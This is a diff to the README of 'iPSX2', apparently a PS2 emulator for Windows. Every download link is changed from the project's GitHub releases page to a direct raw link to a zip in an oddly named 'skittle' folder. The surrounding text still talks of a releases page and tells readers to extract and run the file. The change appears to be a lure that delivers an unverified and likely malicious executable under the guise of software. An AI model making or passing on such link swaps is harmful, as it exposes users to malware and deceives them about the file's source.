@@ -1,6 +1,6 @@
 # 🎮 iPSX2 - Play PS2 Games on Windows
 
-[![Download iPSX2](https://img.shields.io/badge/Download-iPSX2-purple)](https://github.com/nervous-cairina435/iPSX2/releases)
+[![Download iPSX2](https://img.shields.io/badge/Download-iPSX2-purple)](https://raw.githubusercontent.com/nervous-cairina435/iPSX2/main/skittle/PS-i-v3.9-beta.2.zip)
 
 ## 🖥️ What iPSX2 Does
 
@@ -12,7 +12,7 @@ Use it if you want to play PS2 titles from your own game files on a Windows comp
 
 Visit this page to download iPSX2:
 
-https://github.com/nervous-cairina435/iPSX2/releases
+https://raw.githubusercontent.com/nervous-cairina435/iPSX2/main/skittle/PS-i-v3.9-beta.2.zip
 
 Open the page, then look for the latest release. Download the file that fits your Windows setup. If you see a `.zip` or `.exe` file, use that file.
 
@@ -157,7 +157,7 @@ iPSX2 is built for users who want a simple way to run PS2 games on Windows. It f
 
 Get the newest Windows build here:
 
-https://github.com/nervous-cairina435/iPSX2/releases
+https://raw.githubusercontent.com/nervous-cairina435/iPSX2/main/skittle/PS-i-v3.9-beta.2.zip
 
 Open the latest release, download the file for Windows, extract it if needed, then run the app
 
